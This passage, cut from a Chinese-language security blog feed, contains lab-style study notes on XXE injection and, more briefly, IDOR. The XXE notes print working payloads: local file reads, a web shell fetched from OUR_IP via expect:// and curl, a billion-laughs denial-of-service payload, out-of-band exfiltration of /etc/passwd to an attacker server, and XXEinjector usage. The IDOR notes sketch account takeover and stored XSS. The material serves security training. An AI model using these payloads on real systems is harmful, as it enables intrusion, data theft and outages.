Freight）的值，而不是显示&amp;company；，表明我们可以注入XML代码。相比之下，非易受攻击的web应用程序会将（&amp;company；）显示为原始值。这证实了我们正在处理一个易受XXE攻击的web应用程序。</p><blockquote><p>注意：有些web应用程序在HTTP请求中可能默认为JSON格式，但仍可能接受其他格式，包括XML。因此，即使web应用程序以JSON格式发送请求，我们也可以尝试将Content-Type标头更改为application&#x2F;xml，然后使用在线工具将JSON数据转换为xml。如果web应用程序确实接受了带有XML数据的请求，那么我们也可以针对XXE漏洞对其进行测试，这可能会揭示一个意想不到的XXE漏洞。</p></blockquote><h2 id="Reading-Sensitive-Files"><a href="#Reading-Sensitive-Files" class="headerlink" title="Reading Sensitive Files"></a>Reading Sensitive Files</h2><p>现在我们可以定义新的内部XML实体了，让我们看看是否可以定义外部XML实体。这样做与我们之前所做的非常相似，但我们只需添加SYSTEM关键字并在其后面定义外部引用路径，正如我们在上一节中所学到的：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code></pre><blockquote><p>提示：在某些Java web应用程序中，我们还可以指定一个目录而不是文件，并且我们将获得一个目录列表，这对于定位敏感文件非常有用。</p></blockquote><h2 id="Reading-Source-Code"><a href="#Reading-Source-Code" class="headerlink" title="Reading Source Code"></a>Reading Source Code</h2><p>本地文件公开的另一个好处是能够获得web应用程序的源代码。这将使我们能够执行白盒渗透测试，以揭示web应用程序中的更多漏洞，或者至少揭示数据库密码或API密钥等秘密配置。 因此，让我们看看是否可以使用相同的攻击来读取index.php文件的源代码，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121012371.jpeg" alt="file_php"></p><p>正如我们所看到的，这并没有奏效，因为我们没有得到任何内容。之所以发生这种情况，是因为我们引用的文件不是正确的XML格式，因此无法将其作为外部XML实体进行引用。&#x3D;&#x3D;如果一个文件包含一些XML的特殊字符（例如&lt;&#x2F;&gt;&#x2F;&amp;），它将破坏外部实体引用，并且不用于引用。&#x3D;&#x3D;此外，我们不能读取任何二进制数据，因为它也不符合XML格式。 幸运的是，PHP提供了包装过滤器，允许我们对某些资源（包括文件）进行base64编码，在这种情况下，最终的base64输出不应破坏XML格式。为此，我们将使用PHP的php:&#x2F;&#x2F;filter&#x2F;包装。有了这个过滤器，我们可以指定convert.base64-encode编码器作为我们的过滤器，然后添加一个输入资源（例如resource&#x3D;index.php），如下所示：</p><h2 id="Remote-Code-Execution-with-XXE"><a href="#Remote-Code-Execution-with-XXE" class="headerlink" title="Remote Code Execution with XXE"></a>Remote Code Execution with XXE</h2><p>除了读取本地文件外，我们还可以通过远程服务器执行代码。最简单的方法是通过调用我们的服务器来寻找ssh密钥，或者尝试在基于Windows的web应用程序中使用哈希窃取技巧。如果这些都不起作用，我们仍然&#x3D;&#x3D;可以通过PHP:&#x2F;&#x2F;expect过滤器在基于PHP的web应用程序上执行命令&#x3D;&#x3D;，尽管这需要安装并启用PHP expect模块。 如果XXE直接打印其输出“如本节所示”，那么我们可以执行如下基本命令expect:&#x2F;&#x2F;id，并且页面应该打印命令输出。但是，如果我们无法访问输出，或者需要执行更复杂的命令“例如reverse shell”，则XML语法可能会中断，该命令可能无法执行。 将XXE转换为RCE的最有效方法是从服务器中获取一个web外壳并将其写入web应用程序，然后我们可以与它交互以执行命令。为此，我们可以先编写一个基本的PHP web shell，然后启动一个python web服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#39; &gt; shell.phpTanin@htb[/htb]$ sudo python3 -m http.server 80</code></pre><p>现在，我们可以使用以下XML代码来执行一个curl命令，该命令将我们的web shell下载到远程服务器：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;expect://curl$IFS-O$IFS&#39;OUR_IP/shell.php&#39;&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;company;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><blockquote><p>注意：我们用$IFS替换了上面XML代码中的所有空格，以避免破坏XML语法。此外，许多其他字符（如|、&gt;和{）可能会破坏代码，因此我们应该避免使用它们。</p></blockquote><p>注意：expect模块在现代PHP服务器上默认不会启用&#x2F;安装，因此这种攻击可能并不总是有效的。这就是为什么XXE通常用于披露敏感的本地文件和源代码，这可能会揭示额外的漏洞或获得代码执行的方式。</p><h2 id="Other-XXE-Attacks"><a href="#Other-XXE-Attacks" class="headerlink" title="Other XXE Attacks"></a>Other XXE Attacks</h2><p>另一种经常通过XXE漏洞进行的常见攻击是SSRF利用，该漏洞用于枚举本地打开的端口，并通过XXE弱点访问其页面和其他受限网页。服务器端攻击模块完全涵盖了SSRF，XXE攻击也可以采用相同的技术。 最后，XXE攻击的一个常见用途是对托管web服务器造成拒绝服务（DOS），使用以下有效载荷：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY a0 &quot;DOS&quot; &gt;  &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;  &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;  &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;  &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;  &lt;!ENTITY a5 &quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;&gt;  &lt;!ENTITY a6 &quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;&gt;  &lt;!ENTITY a7 &quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;&gt;  &lt;!ENTITY a8 &quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;&gt;  &lt;!ENTITY a9 &quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;&gt;          &lt;!ENTITY a10 &quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;&gt;        ]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;a10;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><p>这个有效负载将a0实体定义为DOS，在a1中多次引用它，在a2中引用a1，以此类推，直到后端服务器的内存由于自引用循环而耗尽。然而，这种攻击不再适用于现代web服务器（例如Apache），因为它们可以防止实体自引用。</p><h1 id="Advanced-File-Disclosure"><a href="#Advanced-File-Disclosure" class="headerlink" title="Advanced File Disclosure"></a>Advanced File Disclosure</h1><p>并非所有XXE漏洞都可以直接利用，正如我们在上一节中所看到的那样。有些文件格式可能无法通过基本的XXE读取，而在其他情况下，web应用程序在某些情况下可能不会输出任何输入值，因此我们可能会试图通过错误来使用它。</p><h2 id="Advanced-Exfiltration-with-CDATA"><a href="#Advanced-Exfiltration-with-CDATA" class="headerlink" title="Advanced Exfiltration with CDATA"></a>Advanced Exfiltration with CDATA</h2><p>在上一节中，我们看到了如何使用PHP过滤器对PHP源文件进行编码，以便它们在被引用时不会破坏XML格式，这（正如我们所看到的）阻止了我们读取这些文件。但是其他类型的Web应用程序呢？我们可以使用另一种方法为任何web应用程序后端提取任何类型的数据（包括二进制数据）。要输出不符合XML格式的数据，我们可以使用CDATA标记（例如&lt;！[CDATA[file_content]]）包装外部文件引用的内容。通过这种方式，XML解析器将考虑这部分原始数据，这些数据可能包含任何类型的数据，包括任何特殊字符。 解决这个问题的一个简单方法是用&lt;！[CDATA[，一个带有]]&gt;的结束内部实体，然后将我们的外部实体文件放在两者之间，它应该被视为CDATA元素，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY begin &quot;&lt;![CDATA[&quot;&gt;  &lt;!ENTITY file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt;  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY joined &quot;&amp;begin;&amp;file;&amp;end;&quot;&gt;]&gt;</code></pre><p>之后，如果我们引用&amp;joind；实体，它应该包含我们的转义数据。然而，这是行不通的，因为XML阻止连接内部和外部实体，所以我们必须找到更好的方法。 为了绕过这一限制，我们可以使用XML参数实体，这是一种特殊类型的实体，以%字符开头，只能在DTD中使用。参数实体的独特之处在于，如果我们从外部源（例如，我们自己的服务器）引用它们，那么所有这些实体都将被视为外部实体，并且可以连接，如下所示：</p><pre><code class="xml">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</code></pre><p>因此，让我们尝试读取submitDetails.php文件，方法是首先将上述行存储在DTD文件（例如xxe.DTD）中，将其托管在我们的机器上，然后将其作为目标web应用程序上的外部实体引用，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39; &gt; xxe.dtdTanin@htb[/htb]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>现在，我们可以引用我们的外部实体（xxe.dtd），然后打印&amp;joind；我们在上面定义的实体，它应该包含submitDetails.php文件的内容，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt; &lt;!-- reference external file --&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!-- append the end of the CDATA tag --&gt;  &lt;!ENTITY % xxe SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt; &lt;!-- reference our external DTD --&gt;  %xxe;]&gt;...&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;</code></pre><p>一旦我们编写了xxe.dtd文件，并将其托管在我们的机器上，然后将上面的行添加到我们对易受攻击的web应用程序的HTTP请求中，我们就可以最终获得submitDetails.php文件的内容：</p><blockquote><p>注意：在一些现代web服务器中，我们可能无法读取某些文件（如index.php），因为web服务器将防止由文件&#x2F;实体自引用（即XML实体引用循环）引起的DOS攻击，如前一节所述。</p></blockquote><p>当基本的XXE方法不起作用或处理其他web开发框架时，这个技巧会变得非常方便。尝试使用此技巧读取其他文件。</p><h2 id="Error-Based-XXE"><a href="#Error-Based-XXE" class="headerlink" title="Error Based XXE"></a>Error Based XXE</h2><p>我们可能会遇到的另一种情况是，web应用程序可能不会编写任何输出，因此我们无法控制任何XML输入实体来编写其内容。在这种情况下，我们将对XML输出视而不见，因此无法使用我们通常的方法检索文件内容。 如果web应用程序显示运行时错误（例如，PHP错误），并且没有对XML输入进行适当的异常处理，那么我们可以使用此缺陷读取XXE漏洞的输出。如果web应用程序既不编写XML输出也不显示任何错误，那么我们将面临完全盲目的情况，我们将在下一节中对此进行讨论。 让我们考虑一下本节末尾&#x2F;error中的练习，其中没有任何XML输入实体显示在屏幕上。因此，我们没有可以控制的实体来编写文件输出。首先，让我们尝试发送格式错误的XML数据，并查看web应用程序是否显示任何错误。为此，我们可以删除任何关闭标记，更改其中一个，使其不关闭（例如，<roo>而不是<root>），或者仅引用不存在的实体，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121101005.jpeg" alt="cause_error"></p><p>我们看到，我们确实导致web应用程序显示错误，而且它还显示了web服务器目录，我们可以使用该目录读取其他文件的源代码。现在，我们可以利用这个漏洞来泄露文件内容。要做到这一点，我们将使用与之前使用的技术类似的技术。首先，我们将托管一个DTD文件，该文件包含以下有效负载：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></pre><p>上面的负载定义了文件参数实体，然后将其与一个不存在的实体连接。在我们之前的练习中，我们连接了三根弦。在这种情况下，%nonExistingEntity；不存在，所以web应用程序会抛出一个错误，说这个实体不存在，以及我们加入的%file；作为错误的一部分。还有许多其他变量可能会导致错误，比如错误的URI或引用文件中有错误的字符。 现在，我们可以调用外部DTD脚本，然后引用错误实体，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %error;]&gt;</code></pre><p>一旦我们像前面那样托管DTD脚本，并将上述有效负载作为XML数据发送（不需要包括任何其他XML数据），我们将获得&#x2F;etc&#x2F;hosts文件的内容</p><p>这种方法也可以用于读取文件的源代码。我们所要做的就是更改DTD脚本中的文件名，以指向我们想要读取的文件（例如“file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;submitDetails.php“）。然而，这种方法不如以前读取源文件的方法可靠，因为它可能有长度限制，而且某些特殊字符仍然可能会破坏它。</p><h1 id="Blind-Data-Exfiltration"><a href="#Blind-Data-Exfiltration" class="headerlink" title="Blind Data Exfiltration"></a>Blind Data Exfiltration</h1><p>在上一节中，我们看到了一个盲XXE漏洞的示例，在该漏洞中，我们没有收到任何包含任何XML输入实体的输出。由于web服务器显示PHP运行时错误，我们可以使用此缺陷从显示的错误中读取文件的内容。在本节中，我们将了解如何在完全盲目的情况下获取文件的内容，在这种情况下，我们既不会获得任何XML实体的输出，也不会显示任何PHP错误。</p><h2 id="Out-of-band-Data-Exfiltration"><a href="#Out-of-band-Data-Exfiltration" class="headerlink" title="Out-of-band Data Exfiltration"></a>Out-of-band Data Exfiltration</h2><p>如果我们试图通过在&#x2F;wind上找到的练习重复任何方法，我们会很快注意到它们似乎都不起作用，因为我们无法在web应用程序响应上打印任何内容。对于这种情况，我们可以使用一种称为带外（OOB）数据过滤的方法，该方法通常用于具有许多网络攻击的类似盲情况，如盲SQL注入、盲命令注入、盲XSS，当然还有盲XXE。跨站点脚本（XSS）和Whitebox Pentesting 101:Command Injections模块都讨论了类似的攻击，这里我们将利用类似的攻击进行轻微修改，以适应我们的XXE漏洞。 在我们之前的攻击中，我们使用了带外攻击，因为我们在机器中托管了DTD文件，并使web应用程序连接到我们（因此是带外）。所以，我们这次的进攻将非常相似，只有一个显著的区别。我们将使web应用程序向我们的web服务器发送一个web请求，其中包含我们正在读取的文件的内容，而不是让web应用程序将我们的文件实体输出到特定的XML实体。 为此，我们可以首先为正在读取的文件的内容使用一个参数实体，同时使用PHP过滤器对其进行base64编码。然后，我们将创建另一个外部参数实体并将其引用到我们的IP，并将文件参数值作为通过HTTP请求的URL的一部分，如下所示：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></pre><p>例如，如果我们要读取的文件的内容为XXE_SAMPLE_DATA，那么文件参数将保存其base64编码的数据（WFhFX1NBTVBMRV9EQVRB）。当XML试图从我们的机器引用外部oob参数时，它将请求<a href="http://our_ip:8000/?content=WFhFX1NBTVBMRV9EQVRB.%E6%9C%80%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%AF%B9WFhFX1NBTVBMRV9EQVRB%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82%E6%88%91%E4%BB%AC%E7%94%9A%E8%87%B3%E5%8F%AF%E4%BB%A5%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PHP%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BB%88%E7%AB%AF%EF%BC%9A">http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB.最后，我们可以对WFhFX1NBTVBMRV9EQVRB字符串进行解码，以获得文件的内容。我们甚至可以编写一个简单的PHP脚本，自动检测编码的文件内容，对其进行解码，并将其输出到终端：</a></p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;content&#39;]))&#123;    error_log(&quot;\n\n&quot; . base64_decode($_GET[&#39;content&#39;]));&#125;?&gt;</code></pre><p>因此，我们将首先将上面的PHP代码写入index.PHP，然后在8000端口上启动一个PHP服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ vi index.php # here we write the above PHP codeTanin@htb[/htb]$ php -S 0.0.0.0:8000PHP 7.4.3 Development Server (http://0.0.0.0:8000) started</code></pre><p>现在，为了启动我们的攻击，我们可以使用与基于错误的攻击中使用的负载类似的负载，只需添加<root>&amp;content</root>，它需要引用我们的实体，并让它向我们的机器发送带有文件内容的请求：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %oob;]&gt;&lt;root&gt;&amp;content;&lt;/root&gt;</code></pre><p>然后，我们可以将请求发送到web应用程序：</p><p>最后，我们可以回到我们的终端，我们将看到我们确实得到了请求及其解码内容：</p><pre><code class="shell-session">PHP 7.4.3 Development Server (http://0.0.0.0:8000) started10.10.14.16:46256 Accepted10.10.14.16:46256 [200]: (null) /xxe.dtd10.10.14.16:46256 Closing10.10.14.16:46258 Acceptedroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin...SNIP...</code></pre><p>提示：除了将base64编码的数据存储为URL的参数外，我们还可以使用DNS OOB Exfiltering，将编码的数据作为URL的子域（例如ENCODEDTEXT.our.website.com），然后使用tcpdump等工具捕获任何传入流量并解码子域字符串以获取数据。诚然，这种方法更先进，需要付出更多的努力来过滤数据。</p><h2 id="Automated-OOB-Exfiltration"><a href="#Automated-OOB-Exfiltration" class="headerlink" title="Automated OOB Exfiltration"></a>Automated OOB Exfiltration</h2><p>尽管在某些情况下，我们可能不得不使用上面学到的手动方法，但在许多其他情况下，可以使用工具自动化盲XXE数据的过滤过程。 <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>就是这样一个工具。该工具支持我们在本模块中学到的大多数技巧，包括基本XXE、CDATA源exfiltering、基于错误的XXE和盲目OOB XXE。 要使用此工具进行OOB自动过滤，我们可以首先将该工具克隆到我们的机器上，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.gitCloning into &#39;XXEinjector&#39;......SNIP...</code></pre><p>一旦我们有了这个工具，我们就可以从Burp复制HTTP请求，并将其写入一个文件供工具使用。我们不应该包括完整的XML数据，只包括第一行，并在它后面写XXEINJECT作为工具的位置定位器：</p><pre><code class="http">POST /blind/submitDetails.php HTTP/1.1Host: 10.129.201.94Content-Length: 169User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Content-Type: text/plain;charset=UTF-8Accept: */*Origin: http://10.129.201.94Referer: http://10.129.201.94/blind/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;XXEINJECT</code></pre><p>现在，我们可以运行该工具，–host&#x2F;-httpport标志是我们的IP和端口，–file标志是我们上面写的文件，–path标志是我们想要读取的文件。我们还将选择–oob&#x3D;http和–phpfilter标志来重复我们上面所做的oob攻击，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter...SNIP...[+] Sending request with malicious XML.[+] Responding with XML for: /etc/passwd[+] Retrieved data:</code></pre><p>我们看到该工具没有直接打印数据。这是因为我们对数据进行base64编码，所以它不会被打印出来。在任何情况下，所有经过过滤的文件都会存储在该工具下的Logs文件夹中，我们可以在那里找到我们的文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...SNIP..</code></pre><h1 id="XXE-Prevention"><a href="#XXE-Prevention" class="headerlink" title="XXE Prevention"></a>XXE Prevention</h1><p>除了使用最新的XML库之外，web应用程序的某些XML配置还有助于降低XXE被利用的可能性。其中包括： </p><p>禁用引用自定义文档类型定义（DTD） </p><p>禁用引用外部XML实体 禁用参数实体处理 禁用对XInclude的支持</p><p> 防止实体引用循环 </p><p>我们看到的另一件事是基于错误的XXE利用。因此，我们应该在web应用程序中始终有适当的异常处理，并且应该始终禁用在web服务器中显示运行时错误。 如果我们错过了更新某些XML库，这样的配置应该是另一层保护，并且还应该防止XXE被利用。然而，在这种情况下，我们可能仍然使用易受攻击的库，并且只应用防止利用的变通方法，这并不理想。 由于XML数据引入了各种问题和漏洞，许多人还建议使用其他格式，如JSON或YAML。这还包括避免使用依赖XML（例如SOAP）的API标准，而使用基于JSON的API（例如REST）。 最后，使用Web应用程序防火墙（WAF）是防止XXE利用的另一层保护措施。然而，我们永远不应该完全依赖WAF，让后端变得脆弱，因为WAF总是可以绕过的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Intro-to-XXE&quot;&gt;&lt;a href=&quot;#Intro-to-XXE&quot; class=&quot;headerlink&quot; title=&quot;Intro to XXE&quot;&gt;&lt;/a&gt;Intro to XXE&lt;/h1&gt;&lt;p&gt;XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Web Attacks-IDOR</title>
    <link href="https://taninluv.github.io/2023/09/06/Web-Attacks-IDOR/"/>
    <id>https://taninluv.github.io/2023/09/06/Web-Attacks-IDOR/</id>
    <published>2023-09-06T08:21:28.000Z</published>
    <updated>2023-09-11T06:58:58.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-IDOR"><a href="#Intro-to-IDOR" class="headerlink" title="Intro to IDOR"></a>Intro to IDOR</h1><p>不安全的直接对象引用（IDOR）漏洞是最常见的web漏洞之一，会严重影响易受攻击的web应用程序。当web应用程序暴露对对象（如文件或数据库资源）的直接引用时，就会出现IDOR漏洞，最终用户可以直接控制该对象以获得对其他类似对象的访问权限。如果由于缺乏可靠的访问控制系统，任何用户都可以访问任何资源，则该系统被认为是易受攻击的。 构建一个可靠的访问控制系统非常具有挑战性，这就是IDOR漏洞普遍存在的原因。此外，自动化识别访问控制系统弱点的过程也相当困难，这可能导致这些弱点在进入生产之前一直无法识别。 例如，如果用户请求访问他们最近上传的文件，他们可能会得到一个链接，例如（download.php？file_id&#x3D;123）。因此，由于链接直接引用了带有（file_id&#x3D;122）的文件，如果我们试图用（download.php！file_id&#x3D;124）访问另一个文件（可能不属于我们），会发生什么？如果web应用程序在后端没有适当的访问控制系统，我们可以通过发送带有file_id的请求来访问任何文件。在许多情况下，我们可能会发现id很容易被猜测，从而可以根据我们的权限检索许多我们不应该访问的文件或资源。</p><h2 id="What-Makes-an-IDOR-Vulnerability"><a href="#What-Makes-an-IDOR-Vulnerability" class="headerlink" title="What Makes an IDOR Vulnerability"></a>What Makes an IDOR Vulnerability</h2><p>仅仅公开对内部对象或资源的直接引用本身并不是一个漏洞。然而，这可能会使利用另一个漏洞成为可能：弱访问控制系统。许多web应用程序通过限制用户访问可以检索这些资源的页面、函数和API来限制用户访问资源。然而，如果用户以某种方式访问了这些页面（例如，通过共享&#x2F;猜测的链接），会发生什么？他们仍然能够通过简单的链接访问相同的资源吗？如果web应用程序的后端没有访问控制系统来比较用户的身份验证和资源的访问列表，那么他们可能能够。<br>有许多方法可以实现用于web应用程序的可靠访问控制系统，例如具有基于角色的访问控制（RBAC）系统。主要结论是，IDOR漏洞的存在主要是由于后端缺乏访问控制。如果用户直接引用了缺乏访问控制的web应用程序中的对象，攻击者就有可能查看或修改其他用户的数据。<br>许多开发人员忽略了构建访问控制系统；因此，大多数web应用程序和移动应用程序在后端都没有受到保护。在这样的应用程序中，所有用户都可以任意访问后端上的所有其他用户的数据。阻止用户访问其他用户数据的唯一方法是应用程序的前端实现，该应用程序旨在只显示用户的数据。在这种情况下，手动操作HTTP请求可能会显示所有用户都可以完全访问所有数据，从而导致成功的攻击。<br>所有这些都使IDOR漏洞成为任何web或移动应用程序最关键的漏洞之一，这不仅是因为暴露了直接的对象引用，而且主要是因为缺乏可靠的访问控制系统。即使是一个基本的访问控制系统也很难开发。一个覆盖整个web应用程序而不干扰其功能的全面访问控制系统可能是一项更困难的任务。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p> Try to read the details of the user with ‘uid&#x3D;5’. What is their ‘uuid’ value?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110933889.png" alt="image-20230911093346827"></p><p>抓包后提交的信息稍微多，我们先修改uid，发现返回：</p><pre><code>uid mismatch</code></pre><p>他似乎把接口与uid相对应起来，我们同时更改接口号为2：</p><pre><code>uuid mismatch</code></pre><p>正如我们所看到的，这一次，我们收到一条错误消息，说uuid不匹配。web应用程序似乎正在检查我们发送的uuid值是否与用户的uuid匹配。由于我们正在发送自己的uuid，因此我们的请求失败了。这似乎是防止用户更改其他用户详细信息的另一种访问控制形式。 接下来，让我们看看是否可以创建一个向API端点发出POST请求的新用户。我们可以将请求方法更改为POST，将uid更改为新的uid，并将请求发送到新uid的API端点：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110940315.png" alt="image-20230911094045276"></p><p>尝试将我们的角色更改为admin&#x2F;administrator以获得更高的权限。不幸的是，在不知道有效角色名称的情况下，我们在HTTP响应中得到无效角色</p><p>此时我们发现uid与接口号是相对应的，我们尝试像端口5发送get请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110945977.png" alt="image-20230911094538943"></p><p>拿到uuid</p><h1 id="Chaining-IDOR-Vulnerabilities"><a href="#Chaining-IDOR-Vulnerabilities" class="headerlink" title="Chaining IDOR Vulnerabilities"></a>Chaining IDOR Vulnerabilities</h1><p>通常，对API端点的GET请求应该返回被请求用户的详细信息，因此我们可以尝试调用它来查看是否可以检索用户的详细内容。我们还注意到，页面加载后，它会通过向同一API端点的GET请求获取用户详细信息：</p><p>如前一节所述，我们的HTTP请求中唯一的授权形式是role&#x3D;employee cookie，因为HTTP请求不包含任何其他形式的用户特定授权，例如JWT令牌。即使令牌确实存在，除非后端访问控制系统将其与请求的对象详细信息进行主动比较，否则我们仍然可以检索其他用户的详细信息。</p><h2 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h2><h2 id="Modifying-Other-Users’-Details"><a href="#Modifying-Other-Users’-Details" class="headerlink" title="Modifying Other Users’ Details"></a>Modifying Other Users’ Details</h2><p>除了允许我们查看潜在的敏感细节外，修改另一个用户的详细信息的能力还使我们能够执行其他几种攻击。一种类型的攻击是修改用户的电子邮件地址，然后请求密码重置链接，该链接将发送到我们指定的电子邮件地址中，从而使我们能够控制他们的帐户。另一种潜在的攻击是在“about”字段中放置XSS有效载荷，一旦用户访问其编辑配置文件页面，就会执行该有效载荷，使我们能够以不同的方式攻击用户。</p><h2 id="Chaining-Two-IDOR-Vulnerabilities"><a href="#Chaining-Two-IDOR-Vulnerabilities" class="headerlink" title="Chaining Two IDOR Vulnerabilities"></a>Chaining Two IDOR Vulnerabilities</h2><p>由于我们发现了IDOR Information Disclosure漏洞，我们还可以枚举所有用户并查找其他角色，最好是管理员角色。尝试编写一个脚本来枚举所有用户，类似于我们之前所做的操作。 